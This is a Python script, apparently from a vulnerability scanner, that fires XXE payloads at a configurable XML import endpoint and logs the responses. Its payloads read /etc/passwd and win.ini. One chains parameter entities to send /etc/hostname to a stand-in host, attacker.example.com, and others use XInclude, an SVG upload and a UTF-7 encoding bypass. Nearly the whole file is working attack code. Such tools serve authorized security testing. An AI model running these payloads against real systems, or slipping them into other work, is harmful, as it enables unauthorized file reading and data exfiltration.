#!/usr/bin/env python3
"""XXE out-of-band extraction — send XML payloads with external entity references.

Output: measurements only; no status or confidence.
Exit codes: 0 = probes completed.
"""

import hashlib
import json
import sys
import time
import uuid
import urllib.request
import urllib.error

# Configuration — replace before running
TARGET_URL = "http://localhost:3000/api/import"
CALLBACK_URL = "http://attacker.example.com:8888/xxe"
METHOD = "POST"  # POST or PUT
AUTH_HEADER = ""  # Optional

# Unique probe IDs for correlating callbacks
PROBE_ID = uuid.uuid4().hex[:12]

# XXE payloads — each with a unique callback path for identification
XXE_PAYLOADS = [
    (
        "basic_external_entity",
        "Basic external entity via SYSTEM",
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{CALLBACK_URL}/{PROBE_ID}/basic">
]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "parameter_entity",
        "Parameter entity for OOB extraction",
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{CALLBACK_URL}/{PROBE_ID}/param">
  %xxe;
]>
<root><data>test</data></root>""",
    ),
    (
        "file_read_etc_passwd",
        "External entity reading /etc/passwd via file://",
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "file_read_win_ini",
        "External entity reading win.ini via file://",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>""",
    ),
    (
        "oob_param_exfil",
        "OOB data exfiltration via parameter entity chaining",
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{CALLBACK_URL}/{PROBE_ID}/exfil?d=%file;'>">
  %eval;
  %exfil;
]>
<root><data>test</data></root>""",
    ),
    (
        "xinclude",
        "XInclude for XML parsers that do not process DTDs",
        """<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",
    ),
    (
        "svg_xxe",
        "XXE via SVG image upload",
        f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{CALLBACK_URL}/{PROBE_ID}/svg">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>""",
    ),
    (
        "utf7_bypass",
        "UTF-7 encoding bypass attempt",
        f"""<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM "{CALLBACK_URL}/{PROBE_ID}/utf7"+AD4-
+AF0APg-
+ADw-root+AD4APA-data+AD4AJg-xxe;+ADw-/data+AD4APA-/root+AD4-""",
    ),
]

# Error patterns that indicate XML parsing with entity support
XXE_ERROR_SIGNATURES = [
    "entity",
    "DOCTYPE",
    "DTD",
    "SYSTEM",
    "ExternalEntity",
    "SAXParseException",
    "XMLParseError",
    "lxml.etree",
    "xml.sax",
    "javax.xml",
    "libxml",
    "parser error",
]


def make_request(url, xml_data, method, headers=None):
    """Send request with XML body."""
    data = xml_data.encode("utf-8")
    req = urllib.request.Request(url, data=data, method=method.upper())
    req.add_header("Content-Type", "application/xml")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }, ""


def main():
    started_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    headers = {}
    if AUTH_HEADER:
        headers["Authorization"] = AUTH_HEADER

    probe_count = 0

    # Step 1: Baseline — well-formed XML without entities
    baseline_xml = '<?xml version="1.0" encoding="UTF-8"?>\n<root><data>ensphere_baseline</data></root>'
    probe_count += 1
    baseline_round, baseline_body = make_request(TARGET_URL, baseline_xml, METHOD, headers)
    print(f"[BASELINE] status={baseline_round['status_code']}, len={baseline_round['body_length']}, time={baseline_round['elapsed_ms']}ms", file=sys.stderr)

    # Step 2: XXE probes
    probe_results = []
    for name, description, payload in XXE_PAYLOADS:
        probe_count += 1
        rr, body = make_request(TARGET_URL, payload, METHOD, headers)
        matched_errors = [sig for sig in XXE_ERROR_SIGNATURES if sig.lower() in body.lower()]

        # Check for known file content signatures that would indicate file read
        file_signatures = []
        if "root:x:0:0" in body or "root:" in body:
            file_signatures.append("passwd_content")
        if "[fonts]" in body or "[extensions]" in body:
            file_signatures.append("win_ini_content")

        print(f"[PROBE:{name}] status={rr['status_code']}, len={rr['body_length']}, errors={len(matched_errors)}, file_sigs={len(file_signatures)}", file=sys.stderr)
        time.sleep(0.5)

        probe_results.append({
            "name": name,
            "description": description,
            "round": rr,
            "hash_matches_baseline": rr["body_hash"] == baseline_round["body_hash"],
            "length_delta": rr["body_length"] - baseline_round["body_length"],
            "matched_error_signatures": matched_errors,
            "file_content_signatures": file_signatures,
            "response_snippet": body[:500] if len(body) > 500 else body,
        })

    result = {
        "vuln_type": "xxe",
        "technique": "xxe_oob",
        "started_at": started_at,
        "probe_count": probe_count,
        "measurements": {
            "probe_id": PROBE_ID,
            "callback_url": CALLBACK_URL,
            "method": METHOD,
            "baseline": baseline_round,
            "xxe_probes": probe_results,
            "probes_tested": len(XXE_PAYLOADS),
        },
    }

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
